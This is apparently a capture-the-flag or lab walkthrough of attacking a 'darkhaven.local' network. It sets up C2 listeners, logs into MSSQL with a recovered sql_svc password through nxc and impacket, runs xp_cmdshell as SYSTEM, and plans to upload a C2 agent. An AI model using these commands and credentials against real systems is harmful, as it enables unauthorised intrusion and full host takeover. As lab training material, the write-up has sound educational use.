So since i have already solved this network i will skip the scope and objectives and jump straight in

# Setting listeners
So to start ill set 5 listeners for the 5 machines in subnet 2

For this ill be using adaptix C2 framework

![](Pasted%20image%2020260419153718.png)

All listeners are now set

# Retrieving credentials for `sql_svc`
Ill log into the web portal as the guest user and then query the sql_svc account to get the credentials

![548](Pasted%20image%2020260419153956.png)

```python
sql_svc:SqLS3rvic3!
```

```python
nxc mssql sql.ext.darkhaven.local -u 'sql_svc' -p 'SqLS3rvic3!'                              
MSSQL       10.10.10.133    1433   SQL              [*] Windows 11 / Server 2025 Build 26100 (name:SQL) (domain:ext.darkhaven.local) (EncryptionReq:False)
MSSQL       10.10.10.133    1433   SQL              [+] ext.darkhaven.local\sql_svc:SqLS3rvic3!
```
These credentials get me access to mssql on the sql server

```python
impacket-mssqlclient ext.darkhaven.local/sql_svc:'SqLS3rvic3!'@sql.ext.darkhaven.local
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL): Line 1: Changed database context to 'master'.
[*] INFO(SQL): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (sql_svc  dbo@master)> xp_cmdshell whoami
output                
-------------------   
nt authority\system   
NULL                  
SQL (sql_svc  dbo@master)>
```
xp_cmdshell is enabled

So on my listener for the sql server ill generate an agent and transfer it to the target

# NT authority system on the sql server

![466](Pasted%20image%2020260419154400.png)

Ive generated an agent for the sql listener and i can use xp_cmdshell to upload the agent then execute it

